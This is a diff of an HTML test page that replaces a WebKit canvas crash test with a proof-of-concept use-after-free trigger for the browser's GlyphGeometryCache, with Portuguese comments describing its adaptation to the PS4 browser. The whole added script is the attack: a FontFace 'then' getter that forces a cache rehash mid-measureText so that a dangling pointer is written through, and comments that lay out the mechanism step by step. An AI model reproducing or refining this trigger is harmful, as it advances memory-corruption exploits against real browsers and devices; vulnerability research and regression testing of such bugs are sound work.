@@ -1,45 +1,90 @@
-
 <!DOCTYPE html>
 <script>
-function gc() {
-    for (let i = 0; i < 10000; i++)
-        new String("abc");
-}
+// UAF GlyphGeometryCache bucket rehash — adaptacao do Teste 1 do commit b4722e2
+// rdar://186024085 / https://bugs.webkit.org/show_bug.cgi?id=323067
+//
+// MECANISMO (diferente dos PoCs anteriores):
+//   FontCascade::width() armazena raw pointer para o bucket array de
+//   GlyphGeometryCache. O getter forca um rehash do cache chamando
+//   measureText() 32 vezes com strings diferentes → cache cresce →
+//   bucket array e realocado → old bucket FREED → raw pointer DANGLING
+//   → width() continua a escrever no ponteiro dangling → UAF WRITE → CRASH
+//
+// DIFERENCAS do PoC anterior (42b1e2a):
+//   Anterior: getter chama document.fonts.add() → m_cache.clear() / m_fonts
+//   Este:     getter chama measureText() x32 → GlyphGeometryCache rehash
+//
+//   Anterior: precisa de dummies para pruneUnreferencedEntries
+//   Este:     50 pre-calls de measureText() populam o cache suficientemente
+//
+// ADAPTACOES para PS4:
+//   OffscreenCanvas → document.createElement('canvas')
+//   local(Helvetica) → Ahem.woff data URL (garantia de carregamento sincrono)
+//   FontFace.prototype.then → face.then (instancia, confirmado no PS4)
 
-function enter(outer, inner) {
-    let canvas = document.createElement("canvas");
-    let innerCtx;
-    let outerCtx = canvas.getContext(outer, {
-        get colorSpace() { innerCtx = canvas.getContext(inner); return "srgb"; },
-        get alpha() { innerCtx = canvas.getContext(inner); return true; },
+fetch('Ahem.woff')
+    .then(function(r) { return r.arrayBuffer(); })
+    .then(function(b) {
+        return new Promise(function(res, rej) {
+            var fr = new FileReader();
+            fr.onload  = function(e) { res(e.target.result); };
+            fr.onerror = rej;
+            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
+        });
+    })
+    .then(function(dataUrl) {
+
+        function attempt(n) {
+            var family = 'VarFam' + n;
+            var face = new FontFace(family, 'url("' + dataUrl + '")');
+            void face.loaded;
+            document.fonts.add(face);
+
+            // Canvas DOM (substitui OffscreenCanvas do upstream)
+            var c = document.createElement('canvas');
+            c.width = 200; c.height = 50;
+            c.style.cssText = 'position:absolute;left:-9999px';
+            document.body.appendChild(c);
+            var ctx = c.getContext('2d');
+
+            // Times como primary (cobre Latin), family como fallback (Cherokee)
+            ctx.font = '20px Times, ' + family;
+
+            var inGetter = false;
+            Object.defineProperty(face, 'then', {
+                configurable: true,
+                get: function() {
+                    if (inGetter) return undefined;
+                    inGetter = true;
+                    // 32 measureText calls com strings diferentes forcam
+                    // GlyphGeometryCache a crescer e fazer rehash.
+                    // O bucket array antigo e liberado enquanto a outer
+                    // measureText ainda tem um raw pointer nele → UAF write.
+                    for (var i = 0; i < 16; i++) {
+                        try { ctx.measureText('q' + String.fromCharCode(65 + i) + 'z'); } catch(e) {}
+                        try { ctx.measureText('x'); } catch(e) {}
+                    }
+                    inGetter = false;
+                    return undefined;
+                }
+            });
+
+            // 50 pre-calls para popular o GlyphGeometryCache com entradas
+            // de Times/Latin, aumentando a probabilidade de rehash quando
+            // o getter adiciona mais 32 entradas de Cherokee/family
+            for (var i = 0; i < 50; i++)
+                ctx.measureText('x');
+
+            // Cherokee ausente em Times → glyph walk cai para family (Ahem)
+            // → opportunisticallyStartFontDataURLLoading(face) SINCRONO
+            // → face.loaded resolved → thenable check → getter dispara
+            // → 32x measureText → GlyphGeometryCache rehash → old bucket FREED
+            // → outer measureText raw pointer DANGLING → UAF WRITE → CRASH
+            ctx.measureText('\u13A0\u13A2\u13A4');
+        }
+
+        for (var n = 0; n < 3; n++) {
+            try { attempt(n); } catch(e) {}
+        }
     });
-    document.write("");
-}
-
-function reenter(outer, inner) {
-    let canvas = document.createElement("canvas");
-    canvas.width = 10;
-    canvas.height = 10;
-    let innerCtx;
-    let outerCtx = canvas.getContext(outer, { 
-        get colorSpace() { innerCtx = canvas.getContext(inner); return "srgb"; },
-        get alpha() { innerCtx = canvas.getContext(inner); return true; },
-    });
-    document.write("");
-}
-
-function name(ctx) {
-    return ctx ? ctx.constructor.name : "null";
-}
-
-for (let outer of ["2d", "bitmaprenderer"])
-    for (let inner of ["2d", "bitmaprenderer"])
-        enter(outer, inner);
-
-for (let outer of ["2d", "bitmaprenderer"])
-    for (let inner of ["2d", "bitmaprenderer"])
-        reenter(outer, inner);
-
-gc();
-document.write("PASS if no crash.");
 </script>
